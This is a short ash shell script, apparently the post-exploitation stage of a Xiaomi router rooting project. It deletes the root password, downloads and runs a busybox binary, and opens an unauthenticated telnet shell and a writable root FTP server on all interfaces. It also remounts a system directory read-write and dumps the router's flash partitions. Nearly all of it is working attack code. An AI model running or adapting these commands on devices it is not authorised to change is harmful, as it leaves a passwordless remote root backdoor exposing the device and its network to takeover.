#!/bin/ash

set -euo pipefail

exploit() {
    ########################################
    # Download standalone busybox and start telnet and ftp servers
    ########################################

    passwd -d root # Remove root password, as the default one set by xiaomi is unknown

    # kill/stop telnet, in case it is running from a previous execution
    pgrep busybox | xargs kill || true

    cd /tmp
    rm -rf busybox
    curl "https://www.busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel" --output busybox
    chmod +x busybox

    # Start telnet
    ./busybox telnetd

    # Start FTP server
    ln -sfn busybox ftpd # Create symlink needed for running ftpd
    ./busybox tcpsvd -vE 0.0.0.0 21 ./ftpd -Sw / >> /tmp/messages 2>&1 &

    echo "Done exploiting"
}

remount() {
    echo "Remount /usr/share/xiaoqiang as read-write"

    cp -R /usr/share/xiaoqiang /tmp/xiaoqiang
    mount --bind /tmp/xiaoqiang /usr/share/xiaoqiang

    echo "Done remounting"
}

# Function inspired by https://openwrt.org/docs/guide-user/installation/generic.backup#create_full_mtd_backup
mtd_backup() {
    TMPDIR="/tmp"
    BACKUP_DIR="${TMPDIR}/mtd_backup"
    OUTPUT_FILE="${TMPDIR}/mtd_backup.tgz"

    # Start
    echo "Start"
    rm -rf "${BACKUP_DIR}"
    mkdir -p "${BACKUP_DIR}"

    # List remote mtd devices from /proc/mtd. The first line is just a table
    # header, so skip it (using tail)
    cat /proc/mtd | tail -n+2 | while read; do
        MTD_DEV=$(echo ${REPLY} | cut -f1 -d:)
        MTD_NAME=$(echo ${REPLY} | cut -f2 -d\")
        echo "Backing up ${MTD_DEV} (${MTD_NAME})"
        dd if="/dev/${MTD_DEV}" of="${BACKUP_DIR}/${MTD_DEV}_${MTD_NAME}.bin"
    done
    
    # Do not compress, as the device runs out of storage for such operation
    echo "Done backing up"
}

# From https://stackoverflow.com/a/16159057
"$@"